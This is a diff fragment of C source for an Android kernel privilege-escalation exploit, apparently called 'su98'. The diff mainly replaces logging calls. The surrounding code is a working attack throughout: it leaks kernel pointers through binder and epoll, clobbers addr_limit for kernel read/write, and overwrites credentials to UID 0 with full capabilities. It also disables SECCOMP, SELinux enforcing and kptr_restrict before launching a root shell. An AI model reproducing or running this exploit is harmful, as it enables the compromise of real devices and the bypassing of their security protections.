+            doLog(1, 1, "kfile_ptr_diff: %lu; last_ptr: %lu", kfile_ptr_diff, last_kfile_ptr);
             last_kfile_ptr = next_kfile_ptr;
         }
-        if (worked) message("Allocated %lu bytes of contiguous memory with kmalloc hack", files * KFILE_SIZE); else {
+        if (worked)
+            doLog(1, 1, "Allocated %lu bytes of contiguous memory with kmalloc hack!", files * KFILE_SIZE);
+        else {
             for (i = 0; i < files; i++) close(fds[i]);
-            message("Failed to alloc %lu bytes (target: %d) of contiguous memory with kmalloc hack", files * KFILE_SIZE, size);
+            doLog(1, 1, "Failed to alloc %lu bytes (target: %d) of contiguous memory with kmalloc hack", files * KFILE_SIZE, size);
         }
     }
-    message("kmalloc done");
+    doLog(1, 1, "kmalloc done!");
     struct kmalloc_hack_result ret;
     ret.kmem_start = first_kfile_ptr;
     ret.kmem_end = last_kfile_ptr + kfile_ptr_diff;
     ret.fd_start = first_fd;
     ret.fd_end = fds[files-1];
-    message("alloc res %lu-%lu, %d-%d", ret.kmem_start, ret.kmem_end, ret.fd_start, ret.fd_end);
+    doLog(1, 1, "alloc res %lu-%lu, %d-%d", ret.kmem_start, ret.kmem_end, ret.fd_start, ret.fd_end);
     return ret;
 }
 
@@ -1308,53 +1309,62 @@ int main(int argc, char **argv)
 
     checkKernelVersion();
 
-    message("MAIN: starting exploit for devices with waitqueue at 0x98");
+    doLog(1, 1, "su98 starting up");
 
     if (pipe(kernel_rw_pipe))
-        error( "kernel_rw_pipe");
+        doLog(3, 1, "kernel_rw_pipe");
 
     binder_fd = open("/dev/binder", O_RDONLY);
+
+    // Make sure we can access binder (shouldn't be an issue).
+    if (binder_fd < 0)
+        doLog(3, 1, "binder_fd");
+
     epfd = epoll_create(1000);
+
+    // Make sure we can access epoll (shouldn't be an issue).
+    if (epfd < 0)
+        doLog(3, 1, "epfd");
 
     unsigned long task_struct_plus_8 = 0xDEADBEEFDEADBEEFul;
     unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
 
     if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &task_struct_plus_8)) {
-        error("Failed to leak data");
+        doLog(1, 3, "Failed to leak data");
     }
 
     unsigned long thread_info_ptr;
 
     if (task_struct_plus_8 == USER_DS) {
-        message("MAIN: thread_info is in task_struct");
+        doLog(1, 1, "thread_info is in task_struct");
         thread_info_ptr = task_struct_ptr;
     }
     else {
-        message("MAIN: thread_info should be in stack");
+        doLog(1, 1, "thread_info should be in stack");
         thread_info_ptr = find_thread_info_ptr_kernel3(task_struct_plus_8);
         if (thread_info_ptr  == 0)
-            error("cannot find thread_info on kernel stack");
+            doLog(1, 3, "cannot find thread_info on kernel stack!");
     }
 
-    message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
-    message("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
-    message("MAIN: Clobbering addr_limit");
+    doLog(1, 1, "task_struct_ptr = %lx", task_struct_ptr);
+    doLog(1, 1, "thread_info_ptr = %lx", thread_info_ptr);
+
+    doLog(1, 1, "Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
-
     if (!clobber_data_retry(thread_info_ptr + 8, &src, 8)) {
-        error("Failed to clobber addr_limit");
+        doLog(1, 3, "Failed to clobber data");
     }
 
-    message("MAIN: thread_info = 0x%lx", thread_info_ptr);
+    doLog(1, 1, "Clobbering thread_info = 0x%lx", thread_info_ptr);
     setbuf(stdout, NULL);
-    message("MAIN: should have stable kernel R/W now");
+    doLog(1, 1, "Should have stable kernel R/W now!");
 
-    message("MAIN: searching for cred offset in task_struct");
+    doLog(1, 1, "Searching for cred offset in task_struct");
     unsigned char task_struct_data[PAGE+16];
     kernel_read(task_struct_ptr, task_struct_data, PAGE);
 
     unsigned long offset_task_struct__cred = getCredOffset(task_struct_data);
-    puts("leaking kernel pointer (may take a while)");
+    doLog(1, 1, "leaking kernel pointer (may take a while)");
     quiet = 1;
     kptrLeak(task_struct_ptr);
     kptrInit = 1;
@@ -1363,30 +1373,39 @@ int main(int argc, char **argv)
     unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
     unsigned long real_cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred - 8);
 
-    message("MAIN: using last successful search_base = %lx", search_base);
-    unsigned long kptr_res = findSymbol(search_base, "kptr_restrict");
-    kernel_write_uint(kptr_res, 0);
-    unsigned long policydb_ptr = findSymbol(search_base, "policydb");
-    message("MAIN: the policydb is located at %lu", policydb_ptr);
+    doLog(1, 1, "Using last successful search_base = %lx", search_base);
 
+    doLog(1, 1, "Searching for kptr_restrict...");
+    unsigned long kptr_res = findSymbol(search_base, "kptr_restrict");
+    doLog(1, 1, "Found kptr_restrict at %lu!", kptr_res);
+
+    doLog(1, 1, "Disabling kptr_restrict...");
+    kernel_write_uint(kptr_res, 0);
+
+    doLog(1, 1, "Searching for policydb...");
+    unsigned long policydb_ptr = findSymbol(search_base, "policydb");
+    doLog(1, 1, "Found policydb at %lu!", policydb_ptr);
+
+    doLog(1, 1, "Searching for selinux_enforcing...");
     unsigned long selinux_enforcing = find_selinux_enforcing(search_base);
+    doLog(1, 1, "Found selinux_enforcing at %lu!", selinux_enforcing);
 
     unsigned int oldUID = getuid();
     unsigned int newUid = 0;
-    message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
 
+    doLog(1, 1, "setting root credentials with cred offset %lx", offset_task_struct__cred);
     for (int i = 0; i < 8; i++) {
         kernel_write_uint(cred_ptr + OFFSET__cred__uid + i * 4, newUid);
         kernel_write_uint(real_cred_ptr + OFFSET__cred__uid + i * 4, newUid);
     }
 
     if (getuid() != newUid)
-        error( "changing UIDs to %i",newUid);
+        doLog(1, 1, "Unable to set UID to %i", newUid);
 
-    message("MAIN: UID = %i",newUid);
-    message("MAIN: enabling capabilities");
+    doLog(1, 1, "UID = %i", newUid);
 
     // Reset 'securebits'
+    doLog(1, 1, "Resetting securebits (0x%lx)", cred_ptr + OFFSET__cred__securebits);
     kernel_write_uint(cred_ptr + OFFSET__cred__securebits, 0);
     kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_permitted, 0x3fffffffffUL);
@@ -1395,38 +1414,36 @@ int main(int argc, char **argv)
     kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
 
     struct kmalloc_hack_result allocd = kmalloc(100, task_struct_ptr);
-    message("kalloc done!");
     struct kmalloc_hack_result allocd2 = kmalloc(1000, task_struct_ptr);
-    message("kalloc done!");
 
     execlp("sh", "sh", (char*)0);
     int seccompStatus = prctl(PR_GET_SECCOMP);
-    message("MAIN: SECCOMP status %d", seccompStatus);
+    doLog(1, 1, "SECCOMP status %d", seccompStatus);
+
     if (seccompStatus)
     {
-        message("MAIN: disabling SECCOMP");
+        doLog(1, 1, "Disabling SECCOMP...");
         kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
         int offset__task_struct__seccomp = getSeccompOffset(task_struct_data, offset_task_struct__cred, seccompStatus);
         if (offset__task_struct__seccomp < 0)
-            message("MAIN: **FAIL** cannot find seccomp offset");
+            doLog(1, 3, "Failed to find seccomp offset");
         else {
-            message("MAIN: seccomp offset %lx", offset__task_struct__seccomp);
+            doLog(1, 1, "SECCOMP offset = %ld", offset__task_struct__seccomp);
             kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp, 0);
             kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp + 8, 0);
-            message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
+            doLog(1, 1, "SECCOMP status %d", prctl(PR_GET_SECCOMP));
         }
     }
 
     unsigned prev_selinux_enforcing = 1;
 
     if (selinux_enforcing == 0)
-        message("MAIN: **FAIL** did not find selinux_enforcing symbol");
+        doLog(1, 1, "Unable to find selinux_enforcing symbol!");
     else
     {
         prev_selinux_enforcing = kernel_read_uint(selinux_enforcing);
         kernel_write_uint(selinux_enforcing, 0);
-        message("MAIN: disabled selinux enforcing");
-
+        doLog(1, 1, "Disabled selinux enforcing");
         cacheSymbol("selinux_enforcing", selinux_enforcing);
     }
 
@@ -1434,40 +1451,39 @@ int main(int argc, char **argv)
         char cwd[1024];
         getcwd(cwd, sizeof(cwd));
 
-        message("MAIN: re-joining init mount namespace");
+        doLog(1, 1, "rejoining init fs namespace...");
         int fd = open("/proc/1/ns/mnt", O_RDONLY);
 
         if (fd < 0) {
-            error("open");
+            doLog(1, 3, "Unable to open /proc/1/ns/mnt!");
             exit(1);
         }
 
         if (setns(fd, CLONE_NEWNS) < 0) {
-            message("MAIN: **partial failure** could not rejoin init fs namespace");
+            doLog(1, 3, "Unable to rejoin init fs namespace!");
         }
 
-        message("MAIN: rejoining init net namespace");
-
+        doLog(1, 1, "rejoining init net namespace...");
         fd = open("/proc/1/ns/net", O_RDONLY);
 
         if (fd < 0) {
-            error("open");
+            doLog(1, 3, "Unable to open /proc/1/ns/net!");
         }
 
         if (setns(fd, CLONE_NEWNET) < 0) {
-            message("MAIN: **partial failure** could not rejoin init net namespace");
+            doLog(1, 3, "Unable to rejoin init net namespace!");
         }
 
         chdir(cwd);
     }
 
-    message("MAIN: root privileges ready");
+    doLog(1, 1, "root privilegies are ready!");
 
     if (command || argc == 2) {
         execlp("sh", "sh", "-c", argv[1], (char *)0);
     }
     else {
-        message("MAIN: popping out root shell");
+        doLog(1, 1, "Starting shell...");
         execlp("sh", "sh", (char*)0);
     }
 
